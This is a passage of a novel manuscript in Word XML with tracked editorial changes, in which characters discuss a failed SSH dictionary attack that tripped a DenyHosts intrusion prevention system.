          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>heavily guarded</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> back door,” Mike emphasized. “The connection is encrypted. It’s useless without login credentials.”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“Which we were trying to figure out…”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scoffed, “Yeah, using SSHatter, on </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>one</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> host.”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“In English?” Jason insisted.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answered, “SSHatter is a program that performs something called a dictionary attack. It has a database of common usernames and passwords. We rigged SSHatter to connect to Tungsten over and over again, as fast as it can, using common logins until we stumble across one that works.”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“Except that’s not how it’s supposed to be used,” Mike added flatly. “The number of possible username and password combinations is astronomical. SSHatter is designed for distributed operation — you’re supposed to divide up the task across a botnet with thousands of zombie hosts. And even then, the process can take days, without any guarantee of success. If you try to run it on just </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>one</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> machine,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it could theoretically take </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>years</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, I know,” Danny interrupted. “Look, I realized that the probability of success was low. Fine. But I figured it’s worth at least trying. It can’t hurt,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grimaced. “It most certainly </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>can</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> hurt. You just tripped their DenyHosts IPS.”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Danny’s eyes </w:t>
      </w:r>
      <w:ins w:id="567" w:author="TextVet" w:date="2016-03-15T16:23:00Z">
        <w:r w:rsidR="003742DC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>basilisked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="568" w:author="TextVet" w:date="2016-03-15T16:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00082FAD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>flew open</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. He gasped</w:t>
      </w:r>
      <w:ins w:id="569" w:author="TextVet" w:date="2016-03-15T16:23:00Z">
        <w:r w:rsidR="00F8570E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="570" w:author="TextVet" w:date="2016-03-15T16:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F8570E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> as he</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> realiz</w:t>
      </w:r>
      <w:ins w:id="571" w:author="TextVet" w:date="2016-03-15T16:23:00Z">
        <w:r w:rsidR="00F8570E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="572" w:author="TextVet" w:date="2016-03-15T16:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F8570E">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that</w:t>
      </w:r>
      <w:del w:id="573" w:author="TextVet" w:date="2016-03-15T16:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F8570E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> Mike</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> was </w:t>
      </w:r>
      <w:ins w:id="574" w:author="TextVet" w:date="2016-03-15T16:24:00Z">
        <w:r w:rsidR="00F8570E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>true</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="575" w:author="TextVet" w:date="2016-03-15T16:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F8570E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>right</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prodded, “Their what? ‘DenyHosts IPS’?”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w:t>
      </w:r>
      <w:del w:id="576" w:author="TextVet" w:date="2016-03-15T16:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D0104D">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del w:id="577" w:author="TextVet" w:date="2016-03-15T16:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D0104D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">his face buried in his hands, </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mumbled through his palms, “Their Intrusion Prevention System.”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578" w:author="TextVet" w:date="2016-03-15T16:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008D0FB6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Mike said to Jason, </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“It’s another program that corporate servers use alongside SSH</w:t>
      </w:r>
      <w:ins w:id="579" w:author="TextVet" w:date="2016-03-15T16:26:00Z">
        <w:r w:rsidR="008D0FB6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,” Mike told Jason</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:ins w:id="580" w:author="TextVet" w:date="2016-03-15T16:26:00Z">
        <w:r w:rsidR="00D26BEE">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It watches incoming network connections to detect potential hacker activity. And you know what it considers a giant red flag? When it sees the same machine connecting over and over very fast, trying lots of different logins.”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down. “So when I ran SSHatter on Moshen’s computer…”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finished for him, “You set off their alarm, and now your source IP address is blocked, so none of your connections are getting through.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said nothing.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looked at him sidelong. “Danny, you… Um… You couldn’t seriously think it would be that easy, right? That you could just crack your way through SSH with some app you download from a website? If an SSH-cracking tool like that existed, do you have </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>any idea what that would do to the entire Internet? Hell, system administrators have taken entire companies offline because of </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rumors</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> about stuff like that! Don’t take this the wrong way, Danny, but… Are you sure you know what you’re doing?”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Staring at the floor, his chest tight, Danny managed to squeeze out, “I have everything perfectly under control.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="004E4D44" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="581" w:author="TextVet" w:date="2016-03-15T16:29:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">After </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="582" w:author="TextVet" w:date="2016-03-15T16:29:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="004E4D44">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>He took a</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="583" w:author="TextVet" w:date="2016-03-15T16:32:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:ins w:id="584" w:author="TextVet" w:date="2016-03-15T16:32:00Z">
        <w:r w:rsidR="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ive</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="585" w:author="TextVet" w:date="2016-03-15T16:32:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ew</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> deep breaths</w:t>
      </w:r>
      <w:ins w:id="586" w:author="TextVet" w:date="2016-03-15T16:30:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">, </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="587" w:author="TextVet" w:date="2016-03-15T16:30:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="004E4D44">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> to steady his nerves. As </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:ins w:id="588" w:author="TextVet" w:date="2016-03-15T16:30:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>raised</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="589" w:author="TextVet" w:date="2016-03-15T16:30:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="004E4D44">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>slowly lifted</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his head</w:t>
      </w:r>
      <w:ins w:id="590" w:author="TextVet" w:date="2016-03-15T16:31:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="591" w:author="TextVet" w:date="2016-03-15T16:31:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="004E4D44">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="592" w:author="TextVet" w:date="2016-03-15T16:31:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="004E4D44">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>h</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="593" w:author="TextVet" w:date="2016-03-15T16:33:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>e</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="594" w:author="TextVet" w:date="2016-03-15T16:33:00Z">
        <w:r w:rsidR="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Noticing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="595" w:author="TextVet" w:date="2016-03-15T16:33:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> caught sight of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the coffee shop’s waitstaff</w:t>
      </w:r>
      <w:ins w:id="596" w:author="TextVet" w:date="2016-03-15T16:33:00Z">
        <w:r w:rsidR="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="597" w:author="TextVet" w:date="2016-03-15T16:33:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="598" w:author="TextVet" w:date="2016-03-15T16:33:00Z">
        <w:r w:rsidR="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>h</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="599" w:author="TextVet" w:date="2016-03-15T16:33:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>H</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e watched them for a few silent seconds</w:t>
      </w:r>
      <w:ins w:id="600" w:author="TextVet" w:date="2016-03-15T16:33:00Z">
        <w:r w:rsidR="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="601" w:author="TextVet" w:date="2016-03-15T16:33:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> as</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="602" w:author="TextVet" w:date="2016-03-15T16:34:00Z">
        <w:r w:rsidR="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="603" w:author="TextVet" w:date="2016-03-15T16:34:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>t</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hey scurried about the tables and counters</w:t>
      </w:r>
      <w:ins w:id="604" w:author="TextVet" w:date="2016-03-15T16:34:00Z">
        <w:r w:rsidR="005D6CFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> of another universe</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488"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Tell me that part again about how some system administrators took their companies offline because of rumors of an SSH-cracking tool?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A81E5E" w:rsidRDefault="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:pPrChange w:id="605" w:author="TextVet" w:date="2016-03-15T16:35:00Z">
          <w:pPr>
            <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
